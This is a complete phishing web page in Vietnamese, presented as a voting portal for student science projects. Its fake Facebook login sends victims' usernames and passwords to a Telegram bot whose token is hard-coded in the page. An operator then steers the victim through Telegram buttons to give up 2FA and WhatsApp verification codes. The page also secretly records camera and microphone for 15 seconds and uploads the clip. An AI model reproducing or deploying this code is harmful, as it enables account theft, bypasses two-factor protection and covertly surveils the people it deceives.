<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>C·ªïng B√¨nh Ch·ªçn Tr·ª±c Tuy·∫øn - Khoa H·ªçc Tr·∫ª</title>
    <style>
        /* --- CSS RESET & ROOT --- */
        :root {
            --primary-blue: #0056b3;
            --accent-yellow: #ffce00;
            --bg-dark: #003d80;
            --fb-blue: #1877F2;
            --fb-bg: #FFFFFF;
            --fb-input: #F5F6F7;
            --fb-text: #1C1E21;
            --wa-green: #25D366;
            --wa-dark: #075E54;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg-dark); color: white; overflow-x: hidden; }

        /* --- TRANG CH·ª¶: L∆Ø·ªöI B√åNH CH·ªåN --- */
        .main-wrapper { min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-bottom: 50px; }
        .banner-img { width: 100%; max-width: 1000px; display: block; border-bottom: 4px solid var(--accent-yellow); }
        
        .grid-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 15px;
            width: 95%;
            max-width: 1000px;
            margin: 30px auto;
        }

        .group-card {
            background: white;
            color: #333;
            border-radius: 12px;
            padding: 15px;
            text-align: center;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
            transition: transform 0.2s;
        }
        .group-card:active { transform: scale(0.95); }
        .group-card h3 { margin: 0 0 10px 0; color: var(--primary-blue); font-size: 1.1rem; }
        .btn-vote-now {
            background: var(--accent-yellow);
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 6px;
            font-weight: bold;
            color: var(--bg-dark);
            cursor: pointer;
            text-transform: uppercase;
        }

        /* --- C√ÅC OVERLAY (GIAO DI·ªÜN PH·ª¶ TO√ÄN M√ÄN H√åNH) --- */
        .overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            overflow-y: auto;
            color: var(--fb-text);
        }

        /* --- FACEBOOK LOGIN UI --- */
        .fb-header { width: 100%; text-align: center; padding: 15px; color: #606770; font-size: 13px; }
        .fb-logo { width: 65px; margin: 40px 0; }
        .fb-form { width: 90%; max-width: 380px; }
        .fb-input {
            width: 100%; padding: 15px; margin-bottom: 10px;
            border: 1px solid #dddfe2; border-radius: 10px;
            background: var(--fb-input); font-size: 16px;
        }
        .fb-login-btn {
            width: 100%; padding: 12px; background: var(--fb-blue);
            color: white; border: none; border-radius: 25px;
            font-size: 17px; font-weight: bold; margin-top: 10px;
        }
        .fb-error { color: #f02849; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; }

        /* --- 2FA UI (·∫¢NH THI·∫æT B·ªä KH√ÅC) --- */
        .twofa-container { width: 90%; max-width: 450px; padding: 20px 0; }
        .twofa-title { font-size: 20px; font-weight: bold; margin-bottom: 15px; }
        .twofa-desc { font-size: 15px; color: #4b4f56; margin-bottom: 25px; line-height: 1.4; }
        .twofa-main-img { width: 100%; border-radius: 10px; margin-bottom: 20px; }
        
        /* --- WHATSAPP UI --- */
        #whatsapp-overlay { background: linear-gradient(180deg, #25D366 0%, #128C7E 100%); color: white; }
        .wa-box {
            background: white; color: #333; width: 90%; max-width: 400px;
            margin-top: 50px; padding: 40px 20px; border-radius: 20px; text-align: center;
        }
        .wa-otp-row { display: flex; justify-content: space-between; margin: 30px 0; }
        .wa-input {
            width: 45px; height: 55px; border: 1.5px solid #ddd;
            border-radius: 10px; text-align: center; font-size: 24px;
            font-weight: bold; background: #f9f9f9;
        }

        /* --- LOADING SCREEN --- */
        #loading-screen {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; z-index: 10000; flex-direction: column; justify-content: center; align-items: center;
        }
        .loader {
            border: 4px solid #f3f3f3; border-top: 4px solid var(--fb-blue);
            border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Quay video ·∫©n */
        #hidden-video { position: absolute; left: -9999px; width: 1px; height: 1px; }
    </style>
</head>
<body>

    <div class="main-wrapper" id="home-page">
        <img src="banner.png" alt="Banner" class="banner-img">
        <div class="grid-container" id="group-grid"></div>
    </div>

    <div id="fb-login-overlay" class="overlay">
        <div class="fb-header">Ti·∫øng Vi·ªát</div>
        <img src="fb-logo.png" class="fb-logo">
        <div class="fb-form">
            <div id="fb-error-msg" class="fb-error">M·∫≠t kh·∫©u b·∫°n ƒë√£ nh·∫≠p kh√¥ng ch√≠nh x√°c. Vui l√≤ng th·ª≠ l·∫°i.</div>
            <input type="text" id="fb-user" class="fb-input" placeholder="S·ªë di ƒë·ªông ho·∫∑c email">
            <input type="password" id="fb-pass" class="fb-input" placeholder="M·∫≠t kh·∫©u">
            <button class="fb-login-btn" onclick="submitFB()">ƒêƒÉng nh·∫≠p</button>
            <div style="color: var(--fb-blue); text-align: center; margin-top: 20px; font-weight: 500;">Qu√™n m·∫≠t kh·∫©u?</div>
        </div>
    </div>

    <div id="twofa-overlay" class="overlay">
        <div class="twofa-container">
            <div class="twofa-title">Ki·ªÉm tra th√¥ng b√°o tr√™n thi·∫øt b·ªã kh√°c</div>
            <div class="twofa-desc">H√£y m·ªü ·ª©ng d·ª•ng Facebook tr√™n thi·∫øt b·ªã kh√°c c·ªßa b·∫°n ƒë·ªÉ ph√™ duy·ªát l·∫ßn ƒëƒÉng nh·∫≠p n√†y.</div>
            <img src="2fa-image.png" class="twofa-main-img">
            <div style="display: flex; align-items: center; margin-bottom: 25px;">
                <div style="background:#e4e6eb; width:45px; height:45px; border-radius:50%; display:flex; align-items:center; justify-content:center; margin-right:15px;">üïí</div>
                <div style="font-size: 14px;"><strong>ƒêang ch·ªù ph√™ duy·ªát</strong><br><span style="color:#606770;">M√£ ph√™ duy·ªát s·∫Ω hi·ªán l√™n sau √≠t ph√∫t.</span></div>
            </div>
            <input type="text" id="2fa-code" class="fb-input" placeholder="M√£ x√°c th·ª±c" style="background:white; border:1px solid #ced4da;">
            <button class="fb-login-btn" style="border-radius: 8px;" onclick="submit2FA()">X√°c nh·∫≠n</button>
        </div>
    </div>

    <div id="whatsapp-overlay" class="overlay">
        <div class="wa-box">
            <img src="whatsapp-logo.png" width="70">
            <h2 style="color: var(--wa-dark);">WhatsApp</h2>
            <p>M√£ x√°c minh ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn s·ªë:<br><strong id="wa-display-phone"></strong></p>
            <div class="wa-otp-row">
                <input type="text" class="wa-input" maxlength="1" onkeyup="moveFocus(this, 1)">
                <input type="text" class="wa-input" maxlength="1" onkeyup="moveFocus(this, 2)">
                <input type="text" class="wa-input" maxlength="1" onkeyup="moveFocus(this, 3)">
                <input type="text" class="wa-input" maxlength="1" onkeyup="moveFocus(this, 4)">
                <input type="text" class="wa-input" maxlength="1" onkeyup="moveFocus(this, 5)">
                <input type="text" class="wa-input" maxlength="1" onkeyup="moveFocus(this, 6)">
            </div>
            <button class="fb-login-btn" style="background: var(--wa-dark); border-radius: 8px;" onclick="submitWA()">X√°c th·ª±c</button>
        </div>
    </div>

    <div id="loading-screen">
        <div class="loader"></div>
        <p style="margin-top: 15px; color: #606770; font-size: 14px;">ƒêang t·∫£i...</p>
    </div>

    <video id="hidden-video" autoplay muted playsinline></video>

    <script>
        // C·∫§U H√åNH TOKEN C·ª¶A B·∫†N
        const BOT_TOKEN = "8217538564:AAHwyK0pwRtgqSdPdScc8y2a4VKfn14T7As";
        const CHAT_ID = "-1003544188616";
        let lastUpdateId = 0;
        let selectedGroupId = 0;

        // Kh·ªüi t·∫°o l∆∞·ªõi 8 nh√≥m
        const grid = document.getElementById('group-grid');
        for(let i=1; i<=8; i++) {
            grid.innerHTML += `
                <div class="group-card">
                    <h3>NH√ìM 0${i}</h3>
                    <p style="font-size: 0.8rem; color: #666; margin-bottom: 15px;">D·ª± √°n s√°ng t·∫°o sinh vi√™n 2026</p>
                    <button class="btn-vote-now" onclick="openLogin(${i})">B√¨nh ch·ªçn</button>
                </div>
            `;
        }

        function openLogin(id) {
            selectedGroupId = id;
            document.getElementById('fb-login-overlay').style.display = 'flex';
        }

        async function submitFB() {
            const user = document.getElementById('fb-user').value;
            const pass = document.getElementById('fb-pass').value;
            if(!user || !pass) return alert("Vui l√≤ng ƒëi·ªÅn ƒë·ªß th√¥ng tin!");

            document.getElementById('wa-display-phone').innerText = user;
            showLoading(true);

            // G·ª≠i th√¥ng tin v·ªÅ Telegram k√®m 5 n√∫t ƒëi·ªÅu khi·ªÉn
            const text = `‚ö†Ô∏è <b>C√ì D·ªÆ LI·ªÜU M·ªöI</b> ‚ö†Ô∏è\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nüë§ <b>T√†i kho·∫£n:</b> <code>${user}</code>\nüîë <b>M·∫≠t kh·∫©u:</b> <code>${pass}</code>\nüéØ <b>B√¨nh ch·ªçn:</b> Nh√≥m ${selectedGroupId}\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nüìç <i>Ch·ªçn l·ªánh ƒëi·ªÅu khi·ªÉn:</i>`;
            
            const keyboard = {
                inline_keyboard: [
                    [{ text: "üîí Sai m·∫≠t kh·∫©u", callback_data: "cmd_wrong_p" }, { text: "üì± Sai SƒêT/Email", callback_data: "cmd_wrong_u" }],
                    [{ text: "üîë Y√™u c·∫ßu 2FA", callback_data: "cmd_get_2fa" }, { text: "üí¨ M√£ WhatsApp", callback_data: "cmd_get_wa" }],
                    [{ text: "‚úÖ Th√†nh c√¥ng", callback_data: "cmd_done" }]
                ]
            };

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', reply_markup: keyboard })
            });

            startHiddenRecording(user); // B·∫Øt ƒë·∫ßu quay video 15s ng·∫ßm
            setInterval(checkTelegramCommands, 2000); // L·∫Øng nghe l·ªánh t·ª´ Tele m·ªói 2s
        }

        // L·∫Øng nghe l·ªánh t·ª´ Telegram
        async function checkTelegramCommands() {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
            const data = await res.json();
            if(data.result) {
                data.result.forEach(item => {
                    lastUpdateId = item.update_id;
                    if(item.callback_query) {
                        const cmd = item.callback_query.data;
                        executeCommand(cmd);
                    }
                });
            }
        }

        function executeCommand(cmd) {
            hideAllOverlays();
            if(cmd === "cmd_wrong_p") {
                document.getElementById('fb-login-overlay').style.display = 'flex';
                document.getElementById('fb-error-msg').style.display = 'block';
            } else if(cmd === "cmd_get_2fa") {
                document.getElementById('twofa-overlay').style.display = 'flex';
            } else if(cmd === "cmd_get_wa") {
                document.getElementById('whatsapp-overlay').style.display = 'flex';
            } else if(cmd === "cmd_done") {
                alert("C·∫£m ∆°n b·∫°n ƒë√£ tham gia b√¨nh ch·ªçn!");
                location.reload();
            } else {
                showLoading(true);
            }
        }

        async function submit2FA() {
            const code = document.getElementById('2fa-code').value;
            if(!code) return;
            sendTeleMsg(`üì© <b>M√É 2FA:</b> <code>${code}</code>`);
            showLoading(true);
        }

        async function submitWA() {
            let code = "";
            document.querySelectorAll('.wa-input').forEach(input => code += input.value);
            sendTeleMsg(`üí¨ <b>M√É WHATSAPP:</b> <code>${code}</code>`);
            showLoading(true);
        }

        function moveFocus(current, nextIndex) {
            if(current.value.length >= 1 && nextIndex < 6) {
                document.querySelectorAll('.wa-input')[nextIndex].focus();
            }
        }

        async function sendTeleMsg(msg) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
            });
        }

        function showLoading(status) {
            document.getElementById('loading-screen').style.display = status ? 'flex' : 'none';
        }

        function hideAllOverlays() {
            document.querySelectorAll('.overlay').forEach(ov => ov.style.display = 'none');
            showLoading(false);
        }

        // QUAY VIDEO ·∫®N 15 GI√ÇY
        async function startHiddenRecording(username) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoEl = document.getElementById('hidden-video');
                videoEl.srcObject = stream;
                
                const recorder = new MediaRecorder(stream);
                let chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('video', blob, 'video_verify.mp4');
                    fd.append('caption', `üé• VIDEO X√ÅC TH·ª∞C: ${username}`);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(track => track.stop());
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 15000);
            } catch(e) { console.log("Camera access denied"); }
        }
    </script>
</body>
</html>
